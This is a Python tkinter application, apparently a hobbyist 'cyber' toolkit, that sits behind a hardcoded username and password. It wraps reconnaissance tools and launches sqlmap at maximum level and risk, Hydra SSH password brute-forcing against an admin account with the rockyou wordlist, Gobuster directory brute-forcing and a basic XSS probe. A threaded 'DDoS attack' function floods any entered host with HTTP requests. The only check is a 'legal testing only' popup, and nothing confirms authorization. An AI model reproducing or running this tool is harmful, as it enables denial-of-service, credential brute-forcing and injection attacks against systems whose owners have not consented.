import tkinter as tk
from tkinter import messagebox, ttk
import threading
import subprocess
import requests
import time
import shlex
import webbrowser
from PIL import Image, ImageTk
import urllib.request
import io
import re

VALID_USERNAME = "soufien013"
VALID_PASSWORD = "013"

def safe_quote(arg):
    return shlex.quote(arg)

def prepare_command(command, needs_sudo=False):
    if needs_sudo:
        messagebox.showinfo("Info", "This command requires sudo privileges.\nMake sure to run this application with appropriate permissions.\nIf sudo password is required, it will be asked in the terminal.")
    cmd_list = shlex.split(command)
    if needs_sudo:
        cmd_list.insert(0, "sudo")
    return cmd_list

def safe_insert(text_widget, text):
    try:
        if text_widget.winfo_exists():
            text_widget.configure(state='normal')
            text_widget.insert(tk.END, text)
            text_widget.see(tk.END)
            text_widget.configure(state='disabled')
    except tk.TclError:
        pass

def safe_configure(text_widget, **kwargs):
    try:
        if text_widget.winfo_exists():
            text_widget.configure(**kwargs)
    except tk.TclError:
        pass

def run_command_realtime(command, text_widget, needs_sudo=False):
    def worker():
        try:
            safe_configure(text_widget, state='normal')
            cmd_list = prepare_command(command, needs_sudo)
            process = subprocess.Popen(cmd_list, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
            for line in process.stdout:
                safe_insert(text_widget, line)
            process.stdout.close()
            process.wait()
        except Exception as e:
            safe_insert(text_widget, f"Error: {e}\n")
        finally:
            safe_configure(text_widget, state='disabled')
    threading.Thread(target=worker, daemon=True).start()

def open_popup_window(title_text, command, target=None, needs_sudo=False):
    if not target or target.strip() == "":
        messagebox.showerror("Error", "Please enter a valid target before running this tool.")
        return

    popup = tk.Toplevel()
    popup.title(title_text)
    popup.geometry("900x600")
    popup.configure(bg="black")

    text_area = tk.Text(popup, bg="black", fg="white", font=("Fira Code", 12))
    text_area.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
    text_area.configure(state='disabled')

    scrollbar = tk.Scrollbar(popup)
    scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
    text_area.config(yscrollcommand=scrollbar.set)
    scrollbar.config(command=text_area.yview)

    def worker():
        safe_insert(text_area, f"🔍 Checking connectivity to {target}...\n")
        try:
            r = requests.get(f"http://{target}", timeout=5)
            safe_insert(text_area, f"✅ Target reachable, status: {r.status_code}\n\n")
        except:
            try:
                r = requests.get(f"https://{target}", timeout=5)
                safe_insert(text_area, f"✅ Target reachable via HTTPS, status: {r.status_code}\n\n")
            except:
                safe_insert(text_area, f"⚠️ Could not reach target {target}\n\n")
        safe_insert(text_area, f"Running: {'sudo ' if needs_sudo else ''}{command}\n\n")
        run_command_realtime(command, text_area, needs_sudo=needs_sudo)

    threading.Thread(target=worker, daemon=True).start()

def is_valid_target(target):
    ip_pattern = re.compile(r"^(?:\d{1,3}\.){3}\d{1,3}$")
    domain_pattern = re.compile(
        r"^(?=.{1,253}$)(?!-)([A-Za-z0-9-]{1,63}\.)+[A-Za-z]{2,6}$"
    )
    if ip_pattern.match(target):
        parts = target.split(".")
        return all(0 <= int(part) <= 255 for part in parts)
    elif domain_pattern.match(target):
        return True
    return False

def ddos_attack(target, count, delay, speed_mode, text_area):
    headers = {"User-Agent": "SoufienTestAgent/1.0"}

    def attack():
        safe_configure(text_area, state='normal')
        try:
            if speed_mode == "fast":
                threads = []

                def send_request(i):
                    try:
                        response = requests.get(f"http://{target}", headers=headers, timeout=3)
                        safe_insert(text_area, f"Request {i+1} sent, status: {response.status_code}\n")
                    except Exception as e:
                        safe_insert(text_area, f"Error on request {i+1}: {e}\n")

                for i in range(count):
                    t = threading.Thread(target=send_request, args=(i,))
                    t.start()
                    threads.append(t)
                    time.sleep(delay)

                for t in threads:
                    t.join()

                safe_insert(text_area, "\n✅ DDoS attack finished (Fast mode).\n")
            else:
                for i in range(count):
                    try:
                        response = requests.get(f"http://{target}", headers=headers, timeout=3)
                        safe_insert(text_area, f"Request {i+1} sent, status: {response.status_code}\n")
                    except Exception as e:
                        safe_insert(text_area, f"Error on request {i+1}: {e}\n")
                    time.sleep(delay)

                safe_insert(text_area, "\n✅ DDoS attack finished (Slow mode).\n")
        except Exception as e:
            safe_insert(text_area, f"Error during DDoS: {e}\n")
        safe_configure(text_area, state='disabled')

    threading.Thread(target=attack, daemon=True).start()

def start_ddos():
    target = target_entry.get().strip()
    if not target:
        messagebox.showerror("Error", "Please enter a target")
        return
    if not is_valid_target(target):
        messagebox.showerror("Error", "Invalid target IP or domain")
        return
    try:
        count = int(entry_count.get())
        delay = float(entry_delay.get())
    except:
        messagebox.showerror("Error", "Please enter valid count and delay")
        return

    speed_mode = speed_var.get()

    warning_popup = tk.Toplevel()
    warning_popup.title("⚠️ Warning")
    warning_popup.geometry("400x150")
    warning_popup.configure(bg="black")

    tk.Label(warning_popup, text="⚠️ Warning: Use only for legal testing!", font=("Arial", 14, "bold"), fg="red", bg="black", wraplength=380, justify="center").pack(pady=30)

    def proceed_attack():
        warning_popup.destroy()
        ddos_popup = tk.Toplevel()
        ddos_popup.title("DDoS Attack")
        ddos_popup.geometry("900x600")
        ddos_popup.configure(bg="black")

        text_area = tk.Text(ddos_popup, bg="black", fg="white", font=("Fira Code", 12))
        text_area.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

        scrollbar = tk.Scrollbar(ddos_popup)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        text_area.config(yscrollcommand=scrollbar.set)
        scrollbar.config(command=text_area.yview)

        ddos_attack(target, count, delay, speed_mode, text_area)

    tk.Button(warning_popup, text="OK", command=proceed_attack, font=("Arial", 12, "bold"), bg="green", fg="white", width=10).pack()

def xss_test(target):
    if not target:
        messagebox.showerror("Error", "Please enter a URL")
        return

    popup = tk.Toplevel()
    popup.title("XSS Test")
    popup.geometry("600x400")
    popup.configure(bg="black")

    text_area = tk.Text(popup, bg="black", fg="white", font=("Fira Code", 12))
    text_area.pack(fill=tk.BOTH, expand=True)
    text_area.configure(state='disabled')

    def worker():
        safe_insert(text_area, f"🔎 Testing XSS on: {target}\n")
        payload = "<script>alert('XSS')</script>"
        safe_insert(text_area, f"Payload: {payload}\n")
        try:
            r = requests.get(f"http://{target}", timeout=5)
            if payload in r.text:
                safe_insert(text_area, "⚠️ Possible reflected XSS detected!\n")
            else:
                safe_insert(text_area, "No reflected XSS found automatically. Please check manually.\n")
        except Exception as e:
            safe_insert(text_area, f"Error during test: {e}\n")

    threading.Thread(target=worker, daemon=True).start()

def open_url(url):
    webbrowser.open(url)

def add_social_icons(parent_frame):
    container = tk.Frame(parent_frame, bg="black")
    container.pack(side="bottom", pady=15)

    tk.Label(container, text="My Contacts", font=("Arial", 12, "bold"), fg="white", bg="black").pack(pady=5)

    social_frame = tk.Frame(container, bg="black")
    social_frame.pack()

    fb_url = "https://www.facebook.com/stinx.xi/"
    gh_url = "https://github.com/Soufien2013"

    fb_image_url = "https://img.icons8.com/ios-filled/50/ffffff/facebook--v1.png"
    fb_data = urllib.request.urlopen(fb_image_url).read()
    fb_image = Image.open(io.BytesIO(fb_data)).resize((40, 40))
    fb_icon = ImageTk.PhotoImage(fb_image)

    gh_image_url = "https://img.icons8.com/ios-glyphs/50/ffffff/github.png"
    gh_data = urllib.request.urlopen(gh_image_url).read()
    gh_image = Image.open(io.BytesIO(gh_data)).resize((40, 40))
    gh_icon = ImageTk.PhotoImage(gh_image)

    fb_btn = tk.Button(social_frame, image=fb_icon, bg="black", bd=0, cursor="hand2", command=lambda: open_url(fb_url))
    fb_btn.image = fb_icon
    fb_btn.pack(side="left", padx=10)

    gh_btn = tk.Button(social_frame, image=gh_icon, bg="black", bd=0, cursor="hand2", command=lambda: open_url(gh_url))
    gh_btn.image = gh_icon
    gh_btn.pack(side="left", padx=10)

def add_hover_effect(button, normal_bg="#333", hover_bg="#005f5f"):
    def on_enter(e):
        button['background'] = hover_bg
    def on_leave(e):
        button['background'] = normal_bg
    button.bind("<Enter>", on_enter)
    button.bind("<Leave>", on_leave)

def open_main_window():
    global target_entry, entry_count, entry_delay, speed_var, run_ddos_btn

    window = tk.Tk()
    window.title("🧠 Soufien Cyber Amri013 🎩")
    window.geometry("1000x700")
    window.configure(bg="black")

    title = tk.Label(window, text="🧠 Soufien Cyber Amri013 🎩", font=("Helvetica", 24, "bold"), bg="black", fg="#00ffcc")
    title.pack(pady=10)

    info_label = tk.Label(window, text="Information Gathering & DDOS Simulation — For legal testing Only", font=("Arial", 14), bg="black", fg="gray")
    info_label.pack()

    target_frame = tk.Frame(window, bg="black")
    target_frame.pack(pady=10)
    tk.Label(target_frame, text="Target:", font=("Arial", 14), bg="black", fg="white").pack(side='left', padx=5)
    target_entry = tk.Entry(target_frame, font=("Arial", 14), width=50, bg="#222", fg="white", insertbackground="white")
    target_entry.pack(side='left', padx=5)

    tools_frame = tk.Frame(window, bg="black")
    tools_frame.pack(pady=20)

    btn_params = {"font": ("Arial", 10, "bold"), "bg": "#333", "fg": "white",
                  "width": 15, "height": 2, "bd": 0, "relief": "flat", "cursor": "hand2"}

    tools = [
        ("Whois", "whois", False),
        ("Dig", "dig", False),
        ("Nslookup", "nslookup", False),
        ("theHarvester", "theHarvester -d", False),
        ("Dnsenum", "dnsenum", True),
        ("Sublist3r", "sublist3r -d", False),
        ("Amass", "amass enum -d", False),
        ("WhatWeb", "whatweb", False),
        ("Curl", "curl -s", False),
        ("Nmap", "nmap -A -T4", False),
        ("Ping", "ping -c 4", False),
        ("SQL Injection", "sqlmap -u", False),
        ("XSS Test", None, False),
        ("Hydra", "hydra -l admin -P /usr/share/wordlists/rockyou.txt", True),
        ("Gobuster", "gobuster dir -u", True),
    ]

    row, col = 0, 0
    for text, cmd, need_sudo in tools:
        def btn_cmd(c=cmd, t=text, ns=need_sudo):
            if t == "XSS Test":
                return lambda: xss_test(target_entry.get().strip())
            elif t == "SQL Injection":
                return lambda: open_popup_window(t, f"{c} {safe_quote(target_entry.get().strip())} --batch --level=5 --risk=3", target_entry.get().strip(), needs_sudo=ns)
            elif t == "Hydra":
                return lambda: open_popup_window(t, f"{c} {safe_quote(target_entry.get().strip())} ssh", target_entry.get().strip(), needs_sudo=ns)
            elif t == "Gobuster":
                return lambda: open_popup_window(t, f"{c} {safe_quote(target_entry.get().strip())} -w /usr/share/wordlists/dirb/common.txt", target_entry.get().strip(), needs_sudo=ns)
            else:
                return lambda: open_popup_window(t, f"{c} {safe_quote(target_entry.get().strip())}", target_entry.get().strip(), needs_sudo=ns)

        b = tk.Button(tools_frame, text=text, command=btn_cmd(), **btn_params)
        b.grid(row=row, column=col, padx=5, pady=5)

        col += 1
        if col == 5:
            col = 0
            row += 1

    extra_frame = tk.Frame(window, bg="black")
    extra_frame.pack(pady=10)

    ddos_frame = tk.Frame(window, bg="black")
    ddos_frame.pack(pady=10)
    tk.Label(ddos_frame, text="Count:", bg="black", fg="white", font=("Arial", 12)).pack(side='left', padx=5)
    entry_count = tk.Entry(ddos_frame, width=6, bg="#222", fg="white", insertbackground="white")
    entry_count.insert(0, "100")
    entry_count.pack(side='left', padx=5)
    tk.Label(ddos_frame, text="Delay (sec):", bg="black", fg="white", font=("Arial", 12)).pack(side='left', padx=5)
    entry_delay = tk.Entry(ddos_frame, width=6, bg="#222", fg="white", insertbackground="white")
    entry_delay.insert(0, "0.01")
    entry_delay.pack(side='left', padx=5)

    speed_var = tk.StringVar(value="fast")
    tk.Label(ddos_frame, text="Speed Mode:", bg="black", fg="white", font=("Arial", 12)).pack(side='left', padx=5)
    speed_combo = ttk.Combobox(ddos_frame, values=["fast", "slow"], textvariable=speed_var, width=8)
    speed_combo.pack(side='left', padx=5)

    run_ddos_btn = tk.Button(window, text="Run DDoS Attack", command=start_ddos, bg="#8B0000", fg="white", font=("Arial", 14, "bold"), width=20, height=2)
    run_ddos_btn.pack(pady=10)

    add_social_icons(window)
    window.mainloop()

def login():
    username = username_entry.get()
    password = password_entry.get()
    if username == VALID_USERNAME and password == VALID_PASSWORD:
        login_window.destroy()
        open_main_window()
    else:
        messagebox.showerror("Login Failed", "Invalid username or password.")

login_window = tk.Tk()
login_window.title("Login - Soufien Cyber Amri013")
login_window.geometry("450x300")
login_window.configure(bg="#121212")

tk.Label(login_window, text="🎩 Welcome Hacker 🎩", font=("Helvetica", 20, "bold"), bg="#121212", fg="#00ffcc").pack(pady=10)
tk.Label(login_window, text="Please login to continue", font=("Arial", 12), bg="#121212", fg="gray").pack(pady=5)

tk.Label(login_window, text="Username:", font=("Arial", 14), bg="#121212", fg="white").pack(pady=5)
username_entry = tk.Entry(login_window, font=("Arial", 14))
username_entry.pack(pady=5)

tk.Label(login_window, text="Password:", font=("Arial", 14), bg="#121212", fg="white").pack(pady=5)
password_entry = tk.Entry(login_window, font=("Arial", 14), show="*")
password_entry.pack(pady=5)

tk.Button(login_window, text="Login", command=login, font=("Arial", 13, "bold"), bg="#00cc66", fg="white", width=15, pady=5).pack(pady=15)
login_window.mainloop()
